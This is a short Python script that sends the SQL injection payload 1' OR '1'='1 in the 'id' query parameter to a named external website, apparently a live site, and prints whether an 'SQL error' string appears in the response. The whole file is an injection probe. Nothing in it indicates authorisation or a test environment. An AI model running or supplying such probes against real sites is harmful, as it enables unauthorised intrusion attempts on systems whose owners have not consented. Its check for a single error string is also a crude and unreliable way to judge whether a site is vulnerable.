import requests

url = "https://webrpc.tech/"

payload = "1' OR '1'='1"

response = requests.get(url, params={"id": payload})

if "SQL error" in response.text:
    print("SQL Injection Vulnerability Found!")
else:
    print("No SQL Injection Vulnerability Detected")
